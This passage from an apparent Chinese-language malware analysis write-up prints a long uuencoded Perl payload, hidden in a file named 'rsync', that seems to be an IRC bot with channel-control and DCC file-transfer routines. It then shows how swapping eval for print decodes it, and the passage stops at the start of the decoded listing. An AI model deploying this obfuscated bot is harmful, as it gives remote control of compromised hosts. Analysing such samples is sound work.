E&lt;W,@)&quot;-?(#T]_(#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E!2259-4T&lt;@)%];,%T@.EPP,#$D7ULQ75PP,#$B*3L*?0IS=6(@;7-G(&#x27;L*(&quot;`@_&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B4%))5DU31R`D7ULP72`Z)%];,5TB*3L*?0H*_&lt;W5B(&amp;YO=&amp;EC92![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DY/5$E#12`D7ULP_72`Z)%];,5TB*3L*?0H*&lt;W5B(&amp;]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B_34]$12`D7ULP72`K;R`D7ULQ72(I.PI]&quot;G-U8B!D96]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*_(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`M;R`D7ULQ72(I.PI]&quot;G-U8B!H;W`@&gt;PH@(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S_&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`K:&quot;`D7ULQ72(I.PI]&quot;G-U8B!D96AO&lt;&quot;![&quot;B`@_(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V@@)%];,5TB*3L*?0IS_=6(@=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;MV_(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;1E=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W_*&quot;)-3T1%(&quot;1?6S!=(&quot;UV(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;)A;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[_&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V(@)%];,5TB*3L*?0IS=6(@=6YB86X@&gt;PH@(&quot;!R971U&lt;FX@=6YL_97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;UB(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;MI8VL@&gt;PH@_(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)+24-+(&quot;1?6S!=(&quot;1?6S%=(#HD7ULR72(I_.PI]&quot;@IS=6(@;6]D;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];_,%T@)%];,5TB*3L*?0IS=6(@;6]D92![(&amp;UO9&amp;\\H0%\\I.R!]&quot;@IS=6(@:B![(&quot;9J;VEN*$!?*3L@?0IS=6(@_:F]I;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DI/24X@)%];,%TB*3L*?0IS_=6(@&lt;&quot;![(&#x27;!A&lt;G0H0%\\I.R!]&quot;G-U8B!P87)T(&#x27;MS96YD&lt;F%W*&quot;)005)4(&quot;1?6S!=(BD[?0H*&lt;W5B(&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3DE#2R`D7ULP72(I.PI]&quot;@IS=6(@:6YV_:71E(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B24Y6251%(&quot;1?6S%=(&quot;1?6S!=_(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E1/4$E#_(&quot;1?6S!=(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC(&#x27;L@=&amp;]P:6-O*$!?*3L@?0H*&lt;W5B(&#x27;=H;VES(&#x27;L*(&quot;!R971U_&lt;FX@=6YL97-S(&quot;0C7R`]/2`P.PH@(&#x27;-E;F1R87&lt;H(E=(3TE3(&quot;1?6S!=(BD[&quot;GT*&lt;W5B(&#x27;=H;R![&quot;B`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,#L*(&quot;!S96YD&lt;F%W*&quot;)72$\\@)%];,%TB*3L*?0IS=6(@;F%M97,@&gt;PH@(&#x27;)E_=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3D%-15,@)%];,%TB*3L*?0IS=6(@87=A&gt;2![&quot;B`@_&lt;V5N9&#x27;)A=R@B05=!62`D7ULP72(I.PI]&quot;G-U8B!B86-K(&#x27;L@87=A&gt;2@I.R!]&quot;G-U8B!Q=6ET(&#x27;L*(&quot;!S96YD_&lt;F%W*&quot;)154E4(#HD7ULP72(I.PH@(&amp;5X:70[&quot;GT*&quot;G!A8VMA9V4@1$-#.PH*&lt;W5B(&amp;-O;FYE8W1I;VYS(&#x27;L*_(&quot;`@;7D@0&#x27;)E861Y(#T@)&amp;1C8U]S96PM/F-A;E]R96%D*#$I.PH@(&quot;!F;W)E86-H(&amp;UY(&quot;1F:&quot;`H0&#x27;)E861Y_*2![&quot;B`@(&quot;`@;7D@)&amp;1C8W1I&lt;&amp;\\@/2`D1$-#&gt;R1F:&#x27;U[=&amp;EP;WT[&quot;B`@(&quot;`@;7D@)&amp;%R&lt;75I=F\\@/2`D1$-#_&gt;R1F:&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;`@;7D@)&amp;)Y=&amp;5S(#T@)$1#0WLD9FA]&gt;V)Y=&amp;5S?3L*(&quot;`@(&quot;!M&gt;2`D8W5R_7V)Y=&amp;4@/2`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T[&quot;B`@(&quot;`@;7D@)&amp;YI8VL@/2`D1$-#&gt;R1F:&#x27;U[;FEC:WT[&quot;@H@_(&quot;`@(&amp;UY(&quot;1M&lt;V&lt;[&quot;B`@(&quot;`@;7D@)&amp;YR96%D(#T@&lt;WES&lt;F5A9&quot;@D9F@L(&quot;1M&lt;V&lt;L(#$P,C0P*3L*&quot;B`@(&quot;`@_:68@*&quot;1N&lt;F5A9&quot;`]/2`P(&amp;%N9&quot;`D9&amp;-C=&amp;EP;R`]?B`O7BAG971\\&lt;V5N9&amp;-O;BDD+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$_0T-[)&amp;9H?7MS=&amp;%T=7-](#T@(D-A;F-E;&amp;%D;R([&quot;B`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[_&quot;B`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@;F5X_=#L*(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&amp;EF(&quot;@D9&amp;-C=&amp;EP;R!E&lt;2`B9V5T(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$0T-[)&amp;9H?7MC=7)B_&gt;71E?2`K/2!L96YG=&amp;@H)&amp;US9RD[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1C=7)?8GET92`](&quot;1$0T-[)&amp;9H?7MC=7)B&gt;71E_?3L*&quot;B`@(&quot;`@(&quot;`@;W!E;BA&amp;24Q%+&quot;`B/CX@)&amp;%R&lt;75I=F\\B*3L*(&quot;`@(&quot;`@(&quot;!P&lt;FEN=&quot;!&amp;24Q%(&quot;(D;7-G_(B!I9B`H)&amp;-U&lt;E]B&gt;71E(#P](&quot;1B&gt;71E&lt;RD[&quot;B`@(&quot;`@(&quot;`@8VQO&lt;V4H1DE,12D[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1P_86-K8GET92`](&#x27;!A8VLH(DXB+&quot;`D8W5R7V)Y=&amp;4I.PH@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;!A8VMB&gt;71E(CL*_&quot;B`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;R`]/2`D8W5R7V)Y=&amp;4I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D9&amp;-C7W-E;&quot;T^&lt;F5M;W9E_*&quot;1F:&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@)&amp;9H+3YC;&amp;]S93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[&lt;W1A=&#x27;5S?2`](&quot;)2_96-E8FED;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[&quot;B`@(&quot;`@(&quot;`@(&quot;`@;F5X=#L*_(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@(G-E;F0B*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;V5N_9&quot;`](&quot;1F:&quot;T^86-C97!T.PH@(&quot;`@(&quot;`@(&quot;`@)&#x27;-E;F0M/F%U=&amp;]F;&#x27;5S:&quot;@Q*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&#x27;-E;F0I.PH@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@)$1#_0WLD&lt;V5N9&#x27;U[=&amp;EP;WT@/2`G&lt;V5N9&amp;-O;B&lt;[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI=&amp;EM97T@/2!T:6UE_.PH@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD&lt;V5N9&#x27;U[;FEC:WT@/2`D;FEC:SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V)Y_=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V-U&lt;F)Y=&amp;5](#T@,#L*(&quot;`@(&quot;`@(&quot;`@(&quot;1$_0T-[)&#x27;-E;F1]&gt;V%R&lt;75I=F]](#T@)&amp;%R&lt;75I=F\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI&lt;&#x27;T@/2`D&lt;V5N_9&quot;T^&lt;&amp;5E&lt;FAO&lt;W0[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MP;W)T87T@/2`D&lt;V5N9&quot;T^&lt;&amp;5E&lt;G!O&lt;G0[&quot;B`@_(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MS=&amp;%T=7-](#T@(D5N=FEA;F1O(CL*&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*$9)3$4L_(&quot;(\\(&quot;1A&lt;G%U:79O(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D9F)Y=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@&lt;F5A9&quot;A&amp;24Q%+&quot;`D9F)Y_=&amp;5S+&quot;`Q,#(T*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1S96YD(&quot;(D9F)Y=&amp;5S(CL*(&quot;`@(&quot;`@(&quot;`@(&amp;-L;W-E($9)_3$4[&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@)W-E;F1C;VXG*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D8GET97-?_&lt;V5N9&amp;5D(#T@=6YP86-K*&quot;).(BP@)&amp;US9RD[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T@/2`D8GET_97-?&lt;V5N9&amp;5D.PH@(&quot;`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;U]S96YD960@/3T@)&amp;)Y=&amp;5S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`D9F@M/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_)$1#0WLD9FA]&gt;W-T871U&lt;WT@/2`B16YV:6%D;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[9G1I;65](#T@_=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;YE&gt;&#x27;0[&quot;B`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-%3D1&amp;24Q%+&quot;`B_/&quot;`D87)Q=6EV;R(I.PH@(&quot;`@(&quot;`@(&quot;`@&lt;V5E:RA314Y$1DE,12P@)&amp;)Y=&amp;5S7W-E;F1E9&quot;P@,&quot;D[&quot;B`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D&lt;V5N9%]B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&#x27;)E860H4T5.1$9)3$4L(&quot;1S96YD7V)Y=&amp;5S+&quot;`Q,#(T_*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;-E;F1?8GET97,B.PH@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4T5.1$9)3$4I_.PH@(&quot;`@(&#x27;T*(&quot;`@?0I]&quot;@H*&lt;W5B(%-%3D0@&gt;PH@(&amp;UY(&quot;@D;FEC:RP@)&amp;%R&lt;75I=F\\I(#T@0%\\[&quot;B`@=6YL_97-S(&quot;@M&lt;B`B)&amp;%R&lt;75I=F\\B*2![&quot;B`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@?0H*(&quot;!M&gt;2`D9&amp;-C87)K(#T@)&amp;%R&lt;75I_=F\\[&quot;B`@)&amp;1C8V%R:R`]?B!S+ULN*EPO72A&lt;4RLI+R0Q+SL*&quot;B`@;7D@)&amp;UE=6EP(#T@)#HZ:7)C7W-E&lt;G9E_&lt;G-[(B0Z.DE20U]C=7)?&lt;V]C:V5T(GU[)VUE=6EP)WT[&quot;B`@;7D@)&amp;QO;F=I&lt;&quot;`](&#x27;5N&lt;&amp;%C:R@B3B(L:6YE_=%]A=&amp;]N*&quot;1M975I&lt;&quot;DI.PH*(&quot;!M&gt;2!`9FEL97-T870@/2!S=&amp;%T*&quot;1A&lt;G%U:79O*3L*(&quot;!M&gt;2`D&lt;VEZ95]T_;W1A;#TD9FEL97-T871;-UT[&quot;B`@:68@*&quot;1S:7IE7W1O=&amp;%L(#T](#`I(&#x27;L*(&quot;`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@_?0H*(&quot;!M&gt;2`H)&#x27;!O&lt;G1A+&quot;`D&lt;V5N9&#x27;-O8VLI.PH@(&amp;1O(&#x27;L*(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;!R86YD*#8T-3$Q_*3L*(&quot;`@(&quot;1P;W)T82`K/2`Q,#(T.PH@(&quot;`@)&#x27;-E;F1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^;F5W*$QI_&lt;W1E;CT^,2P@3&amp;]C86Q0;W)T(#T^)&#x27;!O&lt;G1A+&quot;!0&lt;F]T;R`]/B`G=&amp;-P)RD@86YD(&quot;1D8V-?&lt;V5L+3YA9&amp;0H_)&#x27;-E;F1S;V-K*3L*(&quot;!](&#x27;5N=&amp;EL(&quot;1S96YD&lt;V]C:SL*&quot;B`@)$1#0WLD&lt;V5N9&#x27;-O8VM]&gt;W1I&lt;&amp;]](#T@)W-E_;F0G.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MB&gt;71E&lt;WT@_/2`D&lt;VEZ95]T;W1A;#L*(&quot;`D1$-#&gt;R1S96YD&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*&quot;@H@(&quot;8Z.F-T_8W`H(B1N:6-K(BP@(D1#0R!314Y$(&quot;1D8V-A&lt;FL@)&amp;QO;F=I&lt;&quot;`D&lt;&amp;]R=&amp;$@)&#x27;-I&gt;F5?=&amp;]T86PB*3L*&quot;GT*_&quot;G-U8B!&#x27;150@&gt;PH@(&amp;UY(&quot;@D87)Q=6EV;RP@)&amp;1C8VQO;F=I&lt;&quot;P@)&amp;1C8W!O&lt;G1A+&quot;`D8GET97,L(&quot;1N:6-K_*2`]($!?.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H+64@(B1A&lt;G%U:79O(BD[&quot;B`@:68@*&amp;]P96XH1DE,12P@(CX@)&amp;%R_&lt;75I=F\\B*2D@&gt;PH@(&quot;`@(&amp;-L;W-E($9)3$4[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&#x27;)E=&#x27;5R;B@P*3L*(&quot;!]&quot;@H@(&amp;UY_(&quot;1D8V-I&lt;#UF:7AA9&amp;1R*&quot;1D8V-L;VYG:7`I.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H)&amp;1C8W!O&lt;G1A(#P@,3`R-&quot;!O_&lt;B!N;W0@9&amp;5F:6YE9&quot;`D9&amp;-C:7`@;W(@)&amp;)Y=&amp;5S(#P@,2D[&quot;B`@;7D@)&amp;1C8W-O8VL@/2!)3SHZ4V]C:V5T_.CI)3D54+3YN97&lt;H4&#x27;)O=&amp;\\]/B)T8W`B+&quot;!0965R061D&lt;CT^)&amp;1C8VEP+&quot;!0965R4&amp;]R=#T^)&amp;1C8W!O&lt;G1A_+&quot;!4:6UE;W5T/3XQ-2D@;W(@&lt;F5T=7)N(&quot;@P*3L*(&quot;`D9&amp;-C&lt;V]C:RT^875T;V9L=7-H*#$I.PH@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&amp;1C8W-O8VLI.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W1I&lt;&amp;]](#T@)V=E=&quot;&lt;[&quot;B`@)$1#0WLD9&amp;-C_&lt;V]C:WU[:71I;65](#T@=&amp;EM93L*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&amp;1C_8W-O8VM]&gt;V)Y=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MC=7)B&gt;71E?2`](#`[&quot;B`@)$1#0WLD_9&amp;-C&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MI&lt;&#x27;T@/2`D9&amp;-C:7`[&quot;B`@_)$1#0WLD9&amp;-C&lt;V]C:WU[&lt;&amp;]R=&amp;%](#T@)&amp;1C8W!O&lt;G1A.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W-T871U&lt;WT@/2`B_4F5C96)E;F1O(CL*?0H*&lt;W5B(%-T871U&lt;R![&quot;B`@;7D@)&#x27;-O8VME=&quot;`](&#x27;-H:69T.PH@(&amp;UY(&quot;1S;V-K7W1I_&lt;&amp;\\@/2`D1$-#&gt;R1S;V-K971]&gt;W1I&lt;&amp;]].PH@(&#x27;5N;&amp;5S&lt;R`H;&amp;,H)&#x27;-O8VM?=&amp;EP;RD@97$@(F-H870B*2![_&quot;B`@(&quot;!M&gt;2`D;FEC:R`](&quot;1$0T-[)&#x27;-O8VME=&#x27;U[;FEC:WT[&quot;B`@(&quot;!M&gt;2`D87)Q=6EV;R`](&quot;1$0T-[)&#x27;-O_8VME=&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;!M&gt;2`D:71I;64@/2`D1$-#&gt;R1S;V-K971]&gt;VET:6UE?3L*(&quot;`@(&amp;UY(&quot;1F_=&amp;EM92`](&#x27;1I;64[&quot;B`@(&quot;!M&gt;2`D&lt;W1A=&#x27;5S(#T@)$1#0WLD&lt;V]C:V5T?7MS=&amp;%T=7-].PH@(&quot;`@)&amp;9T:6UE_(#T@)$1#0WLD&lt;V]C:V5T?7MF=&amp;EM97T@:68@9&amp;5F:6YE9&quot;@D1$-#&gt;R1S;V-K971]&gt;V9T:6UE?2D[&quot;@H@(&quot;`@_;7D@)&amp;1?=&amp;EM92`](&quot;1F=&amp;EM92TD:71I;64[&quot;@H@(&quot;`@;7D@)&amp;-U&lt;E]B&gt;71E(#T@)$1#0WLD&lt;V]C:V5T?7MC_=7)B&gt;71E?3L*(&quot;`@(&amp;UY(&quot;1B&gt;71E&lt;U]T;W1A;&quot;`](&quot;`D1$-#&gt;R1S;V-K971]&gt;V)Y=&amp;5S?3L*&quot;B`@(&quot;!M&gt;2`D_&lt;F%T92`](#`[&quot;B`@(&quot;`D&lt;F%T92`](&quot;@D8W5R7V)Y=&amp;4O,3`R-&quot;DO)&amp;1?=&amp;EM92!I9B`D8W5R7V)Y=&amp;4@/B`P_.PH@(&quot;`@;7D@)&#x27;!O&lt;F-E;B`](&quot;@D8W5R7V)Y=&amp;4J,3`P*2\\D8GET97-?=&amp;]T86P[&quot;@H@(&quot;`@;7D@*&quot;1R7V1U_=BP@)&#x27;!?9&#x27;5V*3L*(&quot;`@(&amp;EF(&quot;@D&lt;F%T92`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;E]D=78@/2`D,SL@)&#x27;)?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1R871E(#T@(B0Q7&quot;XD,B(N(B1R7V1U_=B([&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&#x27;!O&lt;F-E;B`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;%]D=78@/2`D,SL@)&#x27;!?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1P;W)C96X@/2`B)#%&lt;+B0R(BXB)&#x27;!?_9&#x27;5V(CL*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B@B)&#x27;-O8VM?=&amp;EP;R(L(B1S=&amp;%T=7,B+&quot;(D;FEC:R(L(B1A&lt;G%U:79O_(BPB)&amp;)Y=&amp;5S7W1O=&amp;%L(BP@(B1C=7)?8GET92(L(B1D7W1I;64B+&quot;`B)&#x27;)A=&amp;4B+&quot;`B)&#x27;!O&lt;F-E;B(I.PH@_(&#x27;T*&quot;@H@(&#x27;)E=&#x27;5R;B@P*3L*?0H*&quot;G-U8B!F:7AA9&amp;1R(&#x27;L*(&quot;`@(&amp;UY(&quot;@D861D&lt;F5S&lt;RD@/2!`7SL*&quot;B`@_(&quot;!C:&amp;]M&lt;&quot;`D861D&lt;F5S&lt;SL@(&quot;`@(`H@(&quot;`@:68@*&quot;1A9&amp;1R97-S(#U^(&quot;]&gt;7&amp;0K)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;!R_971U&lt;FX@:6YE=%]N=&amp;]A*&#x27;!A8VL@(DXB+&quot;`D861D&lt;F5S&lt;RD[&quot;B`@(&quot;!](&amp;5L&lt;VEF(&quot;@D861D&lt;F5S&lt;R`]?B`O_7ELQ,ET_7&amp;1[,2PR?5PN6S$R73]&lt;9&#x27;LQ+#)]7&quot;Y;,3)=/UQD&gt;S$L,GU&lt;+ELQ,ET_7&amp;1[,2PR?20O*2![&quot;B`@_(&quot;`@(&quot;`@&lt;F5T=7)N(&quot;1A9&amp;1R97-S.PH@(&quot;`@?2!E;&#x27;-I9B`H)&amp;%D9&#x27;)E&lt;W,@/7X@=&#x27;(O82UZ02U:+R\\I(&#x27;L@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(`H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!I;F5T7VYT;V$H*&quot;AG971H;W-T8GEN86UE*&quot;1AV9&amp;1R97-S*2E;-%TI6S!=*3L*(&quot;`@(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@&lt;F5T=7)N.PH@(&quot;`@?0I]&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>使用了 <code>eval unpack</code> 看起來是需要解密的東西</p>\n<p>發現 perl 有一個函數為 <code>unpack()</code></p>\n<p>所以我們將 開頭的 <code>eval</code> 掉換成 <code>print</code></p>\n<p>在使用 perl 執行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ perl rsync</span><br></pre></td></tr></table></figure>\n\n<p>順利把程式碼解出來了</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span 